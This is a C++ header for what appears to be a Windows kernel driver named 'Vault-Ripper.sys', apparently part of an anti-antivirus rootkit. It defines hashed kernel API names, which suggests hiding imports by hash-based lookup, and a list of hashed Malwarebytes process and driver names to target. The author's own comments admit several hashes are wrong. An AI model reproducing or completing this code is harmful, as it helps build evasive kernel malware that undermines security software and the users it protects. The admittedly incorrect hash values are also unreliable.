#pragma once
#include <ntifs.h>  
#include <intrin.h> 
#include <cstdarg>    
#include <cstddef>    
#include <winsmcrd.h>
#include <cstdint>
#include <ntddk.h>
#include "nt_structs.h"


#define OBGetObjectType_HASH						0x6246ac8b9eb0daa4
#define ExAllocatePoolWithTag_HASH					0xe7c4d473c919c038
#define ExFreePoolWithTag_HASH						0x175d6b13f09b5f2b
#define PsLookupProcessByProcessId_HASH				0xb7eac87c5d15bdab
#define PsGetProcessImageFileName_HASH				0xb6824094e0503f10
#define GetIoDriverObjectType_t_HASH				0xc0892385cfffae01
#define PsGetProcessPeb_t_HASH						0x3c1a868596349c67
#define IoThreadToProcess_t_HASH					0xe0cfa10ba8764872

namespace globals {

	extern uintptr_t stored_one;
	extern void* stored_three;
	extern void* stored_four;
	extern _OBJECT_TYPE* stored_two;


	// AV_Hashes to be added to defensive iterations list
	inline constexpr UINT64 AV_Hashes[] = {
		0x553d6130527311f4,		// MBAMService.exe
		0xc248d15e1873240b,		// MalwareBytes.exe
		0x43db3ecc6f37bf1b,		// MBAMService.exe

		// Pretty sure all these hashes below are wrong, maybe not though, check hashing --> Yeah they are wrong..
		0xc4df760c384b44ba,		// MBAMProtection.sys
		0x1673d042eabcfd05,		// ESProtectionDriver.sys
		0x9d9278af7799b3ca,		// MBAMWebProtectionrk V5.sys
		0x128d4e9af9a85fed,		// MBAMSwissArmypdb.sys
	};


	inline constexpr UINT64 File_Extensions[] = {
	0x520e2a422dac974e		//exe
	};

	inline constexpr UINT64 Tracked_Files[] = {
	0x553d6130527311f4,		// MBAMService.exe

	};

	// This is wrong too
	inline constexpr UINT64 Hashed_Names[] = {
	0xce2cdf20a6e4ed3c,		//Vault-Ripper.sys
	};
}

